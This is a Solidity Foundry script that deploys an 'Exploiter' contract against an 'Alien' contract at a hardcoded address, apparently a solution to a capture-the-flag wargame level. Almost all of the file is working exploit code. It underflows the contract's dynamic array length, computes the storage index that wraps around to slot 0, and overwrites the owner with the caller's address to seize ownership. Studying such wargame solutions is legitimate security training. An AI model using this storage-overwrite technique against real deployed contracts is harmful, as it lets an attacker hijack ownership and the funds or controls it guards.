// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter(0xE577B1f94B13239d2B15A7c3881ebff125EFe6a4);
        vm.stopBroadcast();
    }
}

interface IAlien {
    function owner() external returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Exploiter {
    IAlien public immutable alien;

    constructor(address _instance) {
        alien = IAlien(_instance);
    }

    function exploit() external {
        alien.makeContact();
        alien.retract();
        uint256 slotPos = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(address(msg.sender))));
        alien.revise(slotPos, content);

        require(alien.owner() == msg.sender);
    }
}